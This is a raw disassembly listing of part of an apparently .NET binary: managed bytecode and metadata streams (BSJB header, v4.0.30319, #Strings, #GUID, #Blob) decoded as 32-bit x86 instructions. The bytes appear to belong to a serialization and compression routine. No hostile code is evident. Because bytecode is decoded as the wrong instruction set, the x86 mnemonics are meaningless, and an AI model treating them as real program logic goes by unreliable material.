  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	d0 1d 00 00 23 53    	rcrb   $1,0x53230000
  405a2a:	74 72                	je     0x405a9e
  405a2c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a33:	00 f8                	add    %bh,%al
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 84 28 00 00 23 55 	add    %al,0x55230000(%eax,%ebp,1)
  405a3e:	53                   	push   %ebx
  405a3f:	00 7c 64 00          	add    %bh,0x0(%esp,%eiz,2)
  405a43:	00 10                	add    %dl,(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 8c 64 00 00 40 09 	add    %cl,0x9400000(%esp,%eiz,2)
  405a56:	00 00                	add    %al,(%eax)
  405a58:	23 42 6c             	and    0x6c(%edx),%eax
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	ea 0a 01 00 00 00 00 	ljmp   $0x0,$0x10a
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 4f 19             	add    %cl,0x19(%edi)
  405ae6:	f3 0f 0a             	repz (bad)
  405ae9:	00 8a 00 19 16 0a    	add    %cl,0xa161900(%edx)
  405aef:	00 b5 19 88 18 0a    	add    %dh,0xa188819(%ebp)
  405af5:	00 8e 0f 9b 1d 06    	add    %cl,0x61d9b0f(%esi)
  405afb:	00 3f                	add    %bh,(%edi)
  405afd:	14 9d                	adc    $0x9d,%al
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 7d 08             	add    %bh,0x8(%ebp)
  405b04:	19 16                	sbb    %edx,(%esi)
  405b06:	0a 00                	or     (%eax),%al
  405b08:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405b09:	10 19                	adc    %bl,(%ecx)
  405b0b:	16                   	push   %ss
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	24 18                	and    $0x18,%al
  405b10:	9b                   	fwait
  405b11:	1d 06 00 0f 1a       	sbb    $0x1a0f0006,%eax
  405b16:	f3 0f 0e             	repz femms
  405b19:	00 0a                	add    %cl,(%edx)
  405b1b:	12 f4                	adc    %ah,%dh
  405b1d:	0b 0e                	or     (%esi),%ecx
  405b1f:	00 da                	add    %bl,%dl
  405b21:	18 f4                	sbb    %dh,%ah
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 54 1c 9d          	add    %dl,-0x63(%esp,%ebx,1)
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 3f                	add    %bh,(%edi)
  405b2d:	13 f5                	adc    %ebp,%esi
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 64 10 f3          	add    %ah,-0xd(%eax,%edx,1)
  405b35:	0f 0a                	(bad)
  405b37:	00 30                	add    %dh,(%eax)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 c1                	add    %al,%cl
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 b1 15 12 00 01    	add    %dh,0x1001215(%ecx)
  405b4b:	00 f3                	add    %dh,%bl
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	d9 08                	(bad) (%eax)
  405b52:	b1 15                	mov    $0x15,%cl
  405b54:	06                   	push   %es
  405b55:	00 f8                	add    %bh,%al
  405b57:	07                   	pop    %es
  405b58:	f3 0f 06             	repz clts
  405b5b:	00 e7                	add    %ah,%bh
  405b5d:	0b f5                	or     %ebp,%esi
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 b9 14 de 17 06    	add    %bh,0x617de14(%ecx)
  405b67:	00 9c 05 de 17 06 00 	add    %bl,0x617de(%ebp,%eax,1)
  405b6e:	c7                   	(bad)
  405b6f:	0f 5c 02             	subps  (%edx),%xmm0
  405b72:	06                   	push   %es
  405b73:	00 e6                	add    %ah,%dh
  405b75:	09 b1 15 06 00 53    	or     %esi,0x53000615(%ecx)
  405b7b:	0a b1 15 06 00 03    	or     0x3000615(%ecx),%dh
  405b81:	09 53 15             	or     %edx,0x15(%ebx)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 d1                	add    %dl,%cl
  405b87:	15 00 00 06 00       	adc    $0x60000,%eax
  405b8c:	2b 09                	sub    (%ecx),%ecx
  405b8e:	54                   	push   %esp
  405b8f:	11 06                	adc    %eax,(%esi)
  405b91:	00 b2 09 54 11 06    	add    %dh,0x6115409(%edx)
  405b97:	00 93 09 54 11 06    	add    %dl,0x6115409(%ebx)
  405b9d:	00 3a                	add    %bh,(%edx)
  405b9f:	0a 54 11 06          	or     0x6(%ecx,%edx,1),%dl
  405ba3:	00 06                	add    %al,(%esi)
  405ba5:	0a 54 11 06          	or     0x6(%ecx,%edx,1),%dl
  405ba9:	00 1f                	add    %bl,(%edi)
  405bab:	0a 54 11 06          	or     0x6(%ecx,%edx,1),%dl
  405baf:	00 42 09             	add    %al,0x9(%edx)
  405bb2:	54                   	push   %esp
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 76 09             	add    %dh,0x9(%esi)
  405bb8:	54                   	push   %esp
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 5d 09             	add    %bl,0x9(%ebp)
  405bbe:	0b 0c 06             	or     (%esi,%eax,1),%ecx
  405bc1:	00 17                	add    %dl,(%edi)
  405bc3:	09 92 15 06 00 e8    	or     %edx,-0x17fff9eb(%edx)
  405bc9:	08 b1 15 06 00 cf    	or     %dh,-0x30fff9eb(%ecx)
  405bcf:	09 54 11 06          	or     %edx,0x6(%ecx,%edx,1)
  405bd3:	00 11                	add    %dl,(%ecx)
  405bd5:	03 9d 0b 06 00 af    	add    -0x50fff9f5(%ebp),%ebx
  405bdb:	1b f3                	sbb    %ebx,%esi
  405bdd:	0f 06                	clts
  405bdf:	00 a7 1a f3 0f 06    	add    %ah,0x60ff31a(%edi)
  405be5:	00 eb                	add    %ch,%bl
  405be7:	0b f5                	or     %ebp,%esi
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 e0                	add    %ah,%al
  405bed:	1c 19                	sbb    $0x19,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 1e                	add    %bl,(%esi)
  405bf3:	10 0e                	adc    %cl,(%esi)
  405bf5:	1d 06 00 0d 13       	sbb    $0x130d0006,%eax
  405bfa:	0e                   	push   %cs
  405bfb:	1d 06 00 7e 0b       	sbb    $0xb7e0006,%eax
  405c00:	0e                   	push   %cs
  405c01:	1d 06 00 f8 11       	sbb    $0x11f80006,%eax
  405c06:	f3 0f 0a             	repz (bad)
  405c09:	00 6a 18             	add    %ch,0x18(%edx)
  405c0c:	74 19                	je     0x405c27
  405c0e:	0a 00                	or     (%eax),%al
  405c10:	2d 1a 74 19 0a       	sub    $0xa19741a,%eax
  405c15:	00 ab 0e 74 19 0a    	add    %ch,0xa19740e(%ebx)
  405c1b:	00 34 1d 88 18 0a 00 	add    %dh,0xa1888(,%ebx,1)
  405c22:	2d 08 88 18 0a       	sub    $0xa188808,%eax
  405c27:	00 18                	add    %bl,(%eax)
  405c29:	08 88 18 06 00 c8    	or     %cl,-0x37fff9e8(%eax)
  405c2f:	0c f3                	or     $0xf3,%al
  405c31:	0f 06                	clts
  405c33:	00 e2                	add    %ah,%dl
  405c35:	12 f3                	adc    %bl,%dh
  405c37:	0f 06                	clts
  405c39:	00 45 10             	add    %al,0x10(%ebp)
  405c3c:	f3 0f 0a             	repz (bad)
  405c3f:	00 d1                	add    %dl,%cl
  405c41:	17                   	pop    %ss
  405c42:	74 19                	je     0x405c5d
  405c44:	0a 00                	or     (%eax),%al
  405c46:	6b 17 74             	imul   $0x74,(%edi),%edx
  405c49:	19 06                	sbb    %eax,(%esi)
  405c4b:	00 f1                	add    %dh,%cl
  405c4d:	17                   	pop    %ss
  405c4e:	f3 0f 06             	repz clts
  405c51:	00 a8 05 f3 0f 0a    	add    %ch,0xa0ff305(%eax)
  405c57:	00 80 0f 88 18 0a    	add    %al,0xa18880f(%eax)
  405c5d:	00 f5                	add    %dh,%ch
  405c5f:	0d 9b 1d 0a 00       	or     $0xa1d9b,%eax
  405c64:	4e                   	dec    %esi
  405c65:	1b 74 19 0a          	sbb    0xa(%ecx,%ebx,1),%esi
  405c69:	00 66 11             	add    %ah,0x11(%esi)
  405c6c:	19 16                	sbb    %edx,(%esi)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	8f                   	(bad)
  405c71:	17                   	pop    %ss
  405c72:	35 11 06 00 93       	xor    $0x93000611,%eax
  405c77:	0a f3                	or     %bl,%dh
  405c79:	0f 06                	clts
  405c7b:	00 19                	add    %bl,(%ecx)
  405c7d:	0e                   	push   %cs
  405c7e:	9d                   	popf
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 e7                	add    %ah,%bh
  405c83:	0d f3 0f 0a 00       	or     $0xa0ff3,%eax
  405c88:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405c89:	0d f3 0f 0a 00       	or     $0xa0ff3,%eax
  405c8e:	e4 07                	in     $0x7,%al
  405c90:	f3 0f 06             	repz clts
  405c93:	00 9e 14 f3 0f 06    	add    %bl,0x60ff314(%esi)
  405c99:	00 96 1b 9d 0b 06    	add    %dl,0x60b9d1b(%esi)
  405c9f:	00 c1                	add    %al,%cl
  405ca1:	0f 5c 02             	subps  (%edx),%xmm0
  405ca4:	06                   	push   %es
  405ca5:	00 24 15 9d 0b 0a 00 	add    %ah,0xa0b9d(,%edx,1)
  405cac:	52                   	push   %edx
  405cad:	05 88 18 06 00       	add    $0x61888,%eax
  405cb2:	b8 01 f3 0f 06       	mov    $0x60ff301,%eax
  405cb7:	00 22                	add    %ah,(%edx)
  405cb9:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
  405cbd:	00 62 18             	add    %ah,0x18(%edx)
  405cc0:	53                   	push   %ebx
  405cc1:	15 0a 00 64 12       	adc    $0x1264000a,%eax
  405cc6:	53                   	push   %ebx
  405cc7:	15 06 00 fd 1c       	adc    $0x1cfd0006,%eax
  405ccc:	55                   	push   %ebp
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 80 14 5c 02 06    	add    %al,0x6025c14(%eax)
  405cd5:	00 67 0d             	add    %ah,0xd(%edi)
  405cd8:	5c                   	pop    %esp
  405cd9:	02 0a                	add    (%edx),%cl
  405cdb:	00 b1 06 53 15 06    	add    %dh,0x6155306(%ecx)
  405ce1:	00 35 12 5c 02 0a    	add    %dh,0xa025c12
  405ce7:	00 cf                	add    %cl,%bh
  405ce9:	06                   	push   %es
  405cea:	53                   	push   %ebx
  405ceb:	15 06 00 78 1d       	adc    $0x1d780006,%eax
  405cf0:	55                   	push   %ebp
  405cf1:	00 16                	add    %dl,(%esi)
  405cf3:	00 15 17 dc 02 06    	add    %dl,0x602dc17
  405cf9:	00 36                	add    %dh,(%esi)
  405cfb:	0e                   	push   %cs
